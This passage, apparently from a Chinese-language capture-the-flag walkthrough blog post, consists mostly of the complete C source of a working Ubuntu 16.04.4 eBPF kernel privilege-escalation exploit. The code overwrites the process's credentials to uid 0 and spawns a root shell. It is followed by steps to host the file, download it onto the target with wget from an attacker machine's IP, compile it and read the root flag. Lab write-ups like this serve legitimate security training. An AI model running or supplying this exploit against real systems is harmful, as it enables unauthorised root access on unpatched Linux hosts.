+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm"> * Ubuntu 16.04.4 kernel priv esc
+</span><span class="cm"> *
+</span><span class="cm"> * all credits to @bleidl
+</span><span class="cm"> * - vnik
+</span><span class="cm"> */</span>
+
+<span class="c1">// Tested on:
+</span><span class="c1">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
+</span><span class="c1">// if different kernel adjust CRED offset + check kernel stack size
+</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/un.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define PHYS_OFFSET 0xffff880000000000
+</span><span class="cp">#define CRED_OFFSET 0x5f8
+</span><span class="cp">#define UID_OFFSET 4
+</span><span class="cp">#define LOG_BUF_SIZE 65536
+</span><span class="cp">#define PROGSIZE 328
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">mapfd</span><span class="p">,</span> <span class="n">progfd</span><span class="p">;</span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="n">__prog</span> <span class="o">=</span>  <span class="s">&#34;</span><span class="se">\xb4\x09\x00\x00\xff\xff\xff\xff</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x55\x09\x02\x00\xff\xff\xff\xff</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x18\x19\x00\x00\x03\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x79\x06\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x01\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x79\x07\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x02\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x79\x08\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xbf\x02\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x55\x06\x03\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x79\x73\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x7b\x32\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x55\x06\x02\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x7b\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x7b\x87\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>
+
+<span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">prog_type</span><span class="p">,</span>
+          <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prog_len</span><span class="p">,</span>
+          <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">license</span><span class="p">,</span> <span class="kt">int</span> <span class="n">kern_version</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">prog_type</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">insns</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">prog_len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">license</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">bpf_log_buf</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span> <span class="o">=</span> <span class="n">kern_version</span><span class="p">;</span>
+
+    <span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value_size</span><span class="p">,</span>
+           <span class="kt">int</span> <span class="n">max_entries</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">map_type</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
+    <span class="p">};</span>
+
+    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">__exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;error: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">mapfd</span> <span class="o">=</span> <span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mapfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+
+    <span class="n">progfd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span>
+            <span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">)</span><span class="n">__prog</span><span class="p">,</span> <span class="n">PROGSIZE</span><span class="p">,</span> <span class="s">&#34;GPL&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">progfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockets</span><span class="p">))</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+    <span class="n">ssize_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;write&#34;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;short write: %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">#define __update_elem(a, b, c) \
+</span><span class="cp">    bpf_update_elem(0, (a)); \
+</span><span class="cp">    bpf_update_elem(1, (b)); \
+</span><span class="cp">    bpf_update_elem(2, (c)); \
+</span><span class="cp">    writemsg();
+</span><span class="cp"></span>
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">))</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+
+    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__get_fp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">__write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">credptr</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">;</span>
+
+    <span class="n">fp</span> <span class="o">=</span> <span class="n">__get_fp</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus fp&#34;</span><span class="p">);</span>
+    
+    <span class="n">sp</span> <span class="o">=</span> <span class="n">get_sp</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">sp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus sp&#34;</span><span class="p">);</span>
+    
+    <span class="n">task_struct</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">task_struct</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus task ptr&#34;</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;task_struct = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
+
+    <span class="n">credptr</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">);</span> <span class="c1">// cred
+</span><span class="c1"></span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">credptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus cred ptr&#34;</span><span class="p">);</span>
+
+    <span class="n">uidptr</span> <span class="o">=</span> <span class="n">credptr</span> <span class="o">+</span> <span class="n">UID_OFFSET</span><span class="p">;</span> <span class="c1">// uid
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">uidptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus uid ptr&#34;</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;uidptr = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">);</span>
+    <span class="n">__write</span><span class="p">(</span><span class="n">uidptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// set both uid and gid to 0
+</span><span class="c1"></span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;spawning root shell</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;not vulnerable?&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">prep</span><span class="p">();</span>
+    <span class="n">pwn</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>将 exp 文件上传到服务器：
+本机执行 <code>python -m SimpleHTTPServer 80</code>
+服务器上执行 <code>wget http://10.10.14.10/root.c</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185729.png-water_print" /></p>
+<p>编译 exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc exp.c
+</code></pre></td></tr></table>
+</div>
+</div><p>得到可执行文件，执行后，得到 root 的 shell
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185754.png-water_print" /></p>
+<p><code>car /root/root.txt</code> 获得第二个 flag。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-09-06</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
